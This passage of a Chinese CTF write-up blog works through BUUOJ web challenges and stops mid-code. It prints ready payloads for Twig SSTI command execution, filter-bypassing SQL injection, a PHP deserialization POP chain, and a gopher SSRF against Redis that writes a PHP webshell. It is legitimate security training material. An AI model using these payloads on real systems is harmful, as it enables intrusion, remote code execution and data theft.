loading="lazy"><p>根据流程，测试<code>&#123;&#123;2*'1'&#125;&#125;</code></p><p>输出<code>49</code></p><p>确认为Twig模板引擎</p><p>直接打Payload：</p><p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /f*")&#125;&#125;</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201213145633846.png" class="" title="image-20201213145633846" loading="lazy"><hr><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>注册，登陆，尝试SSTI没有，最后在广告标题处发现SQL注入</p><p>过滤<code> </code>,<code>+</code>,<code>or</code>,<code>and</code>等</p><p>空格用<code>/**/</code>替换</p><p>尝试爆列数，好家伙，22列</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>回显点在2,3</p><p>查一下数据库名</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201213173543614.png" class="" title="image-20201213173543614" loading="lazy"><p>库名web1</p><p>因为ban了<code>or</code>,所以<code>information_schema</code>,这时有<code>mysql.innodb_table_stats</code>，mysql默认是关闭InnoDB存储引擎 ，仅 Mysql&gt;5.6.x 可使用</p><p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">mariadb链接</a></p><p>查表</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201213173634852.png" class="" title="image-20201213173634852" loading="lazy"><p>表名<code> FLAG_TABLE</code>,<code>news</code>,<code>users</code>,<code>gtid_slave_pos</code>,<code>ads</code>,<code>users </code></p><h5 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h5><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;a&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>原型</p><pre class="language-none"><code class="language-none">1&#39;union select 1,(select group_concat(a) from(select 1,2,3 as a union select * from users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>2处是回显点，所以对2出注入，首先联合查询</p><p>然后分析<code>(select group_concat(a) from(select 1,2,3 as a union select * from users)x)</code></p><p>确认users列在web1中，慢慢试，无列名注入表的列数不相同会报错，最后发现users里有三列 </p><p>采用的子查询的方式，子查询是将一个查询语句嵌套在另一个查询语句中，在特定的情况下，一个查询语句的条件需要另一个查询语句来获取，内层查询语句的查询结果，可以为外层查询语句提供查询条件。 </p><p><code>(select 1,2,3 as a union select * from users)</code></p><p>将users这个表里面的查询的结果提供给外部查询，同时把列名转换成a，直接<code>group_concat(a)</code>可得结果</p><img src="/article/Buuoj-WEB-Write-up/image-20201213175809048.png" class="" title="image-20201213175809048" loading="lazy"><hr><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>先上源码</p><pre class="language-php" data-language="php"><code class="language-php">Welcome to index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag is in flag.php</span><span class="token comment">//WTF IS THIS?</span><span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>三个类</p><p><code>Modifier</code>，<code>Show</code>，<code>Test</code></p><p>逐个分析，首先路口题目给了从<code>Show</code>，可能不对，但还是先从<code>Show</code>看</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>三个魔术方法</p><pre class="language-php" data-language="php"><code class="language-php">__construct：当一个对象创建时调用__toString：当一个对象被当作一个字符串被调用__wakeup：反序列化时触发</code></pre><p>从<code>Show</code>入口，会调用<code>__wakeup</code>魔术方法，方法里将<code>$this-&gt;source</code>做字符串在<code>preg_match</code>函数里比较， 如果<code>$this-&gt;source</code>是Show类，这时会调用<code>__toString</code>方法。</p><p>再看<code>Modifier</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>一个魔术方法</p><pre class="language-none"><code class="language-none">__invoke：将对象调用为函数时触发</code></pre><p>很明显的文件包含<code>include</code>，这个类就是最终要读取<code>flag.php</code>的时候使用的了，我们要让<code>Modifier</code>被当做函数调用，这时就会调用<code>__invoke</code>方法，从而调用<code>append</code>函数，进行文件包含。</p><p>最后看<code>Test</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>两个魔术方法</p><pre class="language-none"><code class="language-none">__construct：当一个对象创建时调用__get：用于从不可访问的属性读取数据</code></pre><p>很关键的<code>__get</code>魔术方法，这里会返回<code>$this-&gt;p</code>即<code>$function()</code>作为函数调用，而我们恰好需要让<code>Modifier</code>被当做函数调用，只要在<code>Show</code>里实例化<code>Test</code>类，这样一来一条pop链就形成了。</p><h6 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h6><p>从<code>Show</code>入手，先反序列化函数触发<code>Show</code>类中<code>__wakeup</code>方法，方法内调用函数触发<code>__tosring</code>方法，<code>__tosring</code>中将<code>str</code>实例化为<code>Test</code>类，而<code>Test</code>类中没有<code>source</code>属性，所以会调用<code>__get</code>方法， 将<code>function</code>实例化为<code>Modifier</code>类，触发<code>Modifier</code>中的<code>__invoke</code>方法，最终调用<code>include</code>函数文件包含<code>flag.php</code></p><p>payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token double-quoted-string string">"php://filter/convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"123"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//Show()->__wakeup()->__tostring()->str->Test->__get()->Modefier->__invoke()->"flag.php"</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\r\n"</span><span class="token punctuation">;</span><span class="token comment">//O:4:"Show":2:&#123;s:6:"source";O:4:"Show":2:&#123;s:6:"source";s:3:"123";s:3:"str";O:4:"Test":1:&#123;s:1:"p";O:8:"Modifier":1:&#123;s:6:" * var";s:52:"php://filter/convert.base64-encode/resource=flag.php";&#125;&#125;&#125;s:3:"str";N;&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22123%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span></span></code></pre><p>这里还有小注意点，题目中的php版本为 5.6.40 ，这个版本反序列化对于<code>protected</code>与<code>public</code>类别还是敏感的，可以看到这里是有<code>%00</code>存在的</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135255308.png" class="" title="image-20201218135255308" loading="lazy"><p>可见字符4个，前后都是<code>%00</code>，这时通过数据表传参可能会不准确，例如我本地调会显示如下</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135449017.png" class="" title="image-20201218135449017" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201218135521199.png" class="" title="image-20201218135521199" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201218135543020.png" class="" title="image-20201218135543020" loading="lazy"><p>所以我们最后进行<code>urlencode</code>，保证<code>%00</code>正常传入</p><img src="/article/Buuoj-WEB-Write-up/image-20201218135722862.png" class="" title="image-20201218135722862" loading="lazy"><p>最后包含<code>flag.php</code>，拿到flag</p><hr><h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><p>打开题目</p><img src="/article/Buuoj-WEB-Write-up/image-20201223182110711.png" class="" title="image-20201223182110711" loading="lazy"><p>跟url有关，可能是ssrf，命令执行等，先输入<code>127.0.0.1&amp;whoami</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223182233706.png" class="" title="image-20201223182233706" loading="lazy"><p>被ban，查看源码发现提示<code>?secret</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223182323977.png" class="" title="image-20201223182323977" loading="lazy"><p>发现是linux命令<code>ifconfig</code>内容，考点应该是ssrf打内网</p><p>尝试用<code>file:/</code>读取文件发现被ban，使用 <code>file：/</code>、<code>file:&lt;空格&gt;///</code> 绕过</p><p>读到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//echo $url."\n";</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">,</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//var_dump($match);</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'别这样'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ifconfig'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了<code>file://</code>，<code>dict://</code>，<code>127.0.0.1</code>和<code>localhost</code>，应该是要找本机的服务，爆破下内网同网段下存活主机</p><img src="/article/Buuoj-WEB-Write-up/image-20201223182749451.png" class="" title="image-20201223182749451" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223182807801.png" class="" title="image-20201223182807801" loading="lazy"><p>在<code>10.138.132.10</code>发现提示，爆破其端口，猜测为mysql，redis之类的服务</p><img src="/article/Buuoj-WEB-Write-up/image-20201223184447546.png" class="" title="image-20201223184447546" loading="lazy"><p>在6379端口发现异常，至此明白为redis漏洞</p><p>尝试打redis未授权访问漏洞</p><p>payload:</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2440%0D%0A%0A%0A%3C%3Fphp%20system%28%22find%20/%20-name%20fla%2A%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></code></pre><p>在目标主机上生成<code>shell.php</code>，扫描<code>fla*</code>，以确定flag位置</p><img src="/article/Buuoj-WEB-Write-up/image-20201223184856356.png" class="" title="image-20201223184856356" loading="lazy"><p>排除其他可能，确认flag在根目录，再打</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></code></pre><p><code>cat /flag</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201223185801498.png" class="" title="image-20201223185801498" loading="lazy"><hr><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a><a href="/article/Buuoj-WEB-Write-up/#Comment">[网鼎杯 2018]Comment</a></h2><p>打开题目为留言板，猜测SSTI，sql注入之类的。</p><p>随便留言后跳转登陆界面，sql注入测试无果，看框内字符串，弱密码爆破一波</p><img src="/article/Buuoj-WEB-Write-up/image-20201223193659732.png" class="" title="image-20201223193659732" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223203540497.png" class="" title="image-20201223203540497" loading="lazy"><p>爆破密码为<code>zhangwei666</code></p><p>进去尝试SSTI,sql注入无果，但是sql注入语句被过滤。</p><p>站内查找，发现git泄露</p><img src="/article/Buuoj-WEB-Write-up/image-20201223201810099.png" class="" title="image-20201223201810099" loading="lazy"><p><code>writr_do.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token 